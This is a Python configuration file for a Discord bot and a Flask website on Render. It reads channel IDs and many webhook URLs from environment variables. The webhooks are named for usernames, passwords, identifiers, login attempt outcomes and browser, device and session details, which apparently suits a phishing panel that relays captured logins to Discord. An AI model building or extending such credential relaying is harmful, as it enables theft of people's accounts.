
```python
# config.py
import os

# --- Discord Bot Configuration ---
DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
COMMAND_PREFIX = os.getenv("COMMAND_PREFIX", ".")

# --- Discord Channel IDs ---
WEBSITE_CHANNEL_ID = int(os.getenv("WEBSITE_CHANNEL_ID", "0"))
LOGIN_CHANNEL_ID = int(os.getenv("LOGIN_CHANNEL_ID", "0"))
DISCONNECTED_CHANNEL_ID = int(os.getenv("DISCONNECTED_CHANNEL_ID", "0"))
LOGGING_CHANNEL_ID = int(os.getenv("LOGGING_CHANNEL_ID", "0"))
ERROR_CHANNEL_ID = int(os.getenv("ERROR_CHANNEL_ID", "0"))

# --- Discord Webhook URLs (SET THESE AS ENVIRONMENT VARIABLES ON RENDER) ---
# Each webhook needs a unique environment variable name.
WEBHOOK_USERNAME_INFO = os.getenv("WEBHOOK_USERNAME_INFO")
WEBHOOK_PASSWORD_INFO = os.getenv("WEBHOOK_PASSWORD_INFO")
WEBHOOK_IDENTIFIER_INFO = os.getenv("WEBHOOK_IDENTIFIER_INFO")
WEBHOOK_INVALID_USERNAME_INFO = os.getenv("WEBHOOK_INVALID_USERNAME_INFO")
WEBHOOK_INVALID_PASSWORD_INFO = os.getenv("WEBHOOK_INVALID_PASSWORD_INFO")
WEBHOOK_INVALID_IDENTIFIER_INFO = os.getenv("WEBHOOK_INVALID_IDENTIFIER_INFO")
WEBHOOK_ATTEMPT_COUNTER_INFO = os.getenv("WEBHOOK_ATTEMPT_COUNTER_INFO")
WEBHOOK_ATTEMPT_EXCEEDED_INFO = os.getenv("WEBHOOK_ATTEMPT_EXCEEDED_INFO")
WEBHOOK_RESET_INFO = os.getenv("WEBHOOK_RESET_INFO")
WEBHOOK_CORRECT_INFO = os.getenv("WEBHOOK_CORRECT_INFO")
WEBHOOK_INCORRECT_INFO = os.getenv("WEBHOOK_INCORRECT_INFO")
WEBHOOK_USER_INFO = os.getenv("WEBHOOK_USER_INFO")
WEBHOOK_BROWSER_INFO = os.getenv("WEBHOOK_BROWSER_INFO")
WEBHOOK_DEVICE_INFO = os.getenv("WEBHOOK_DEVICE_INFO")
WEBHOOK_CONNECTION_INFO = os.getenv("WEBHOOK_CONNECTION_INFO")
WEBHOOK_SESSION_INFO = os.getenv("WEBHOOK_SESSION_INFO")

# --- Role ID for Admin Commands (Optional) ---
ADMIN_ROLE_ID_STR = os.getenv("ADMIN_ROLE_ID")
ADMIN_ROLE_ID = int(ADMIN_ROLE_ID_STR) if ADMIN_ROLE_ID_STR and ADMIN_ROLE_ID_STR.isdigit() else None

# --- Your Website Internal API Configuration ---
# This is the base URL for your *internal* Flask API. Discord bot calls this.
WEBSITE_API_BASE_URL = os.getenv("WEBSITE_API_BASE_URL", "http://localhost:8000") # Flask running on this internal port.

# --- Render-provided PORT ---
PORT = int(os.getenv("PORT", "8000")) # Ensure this is also accessed by main.py directly where Flask runs.

# --- Debugging ---
DEBUG_MODE = os.getenv("DEBUG_MODE", "False").lower() == "true
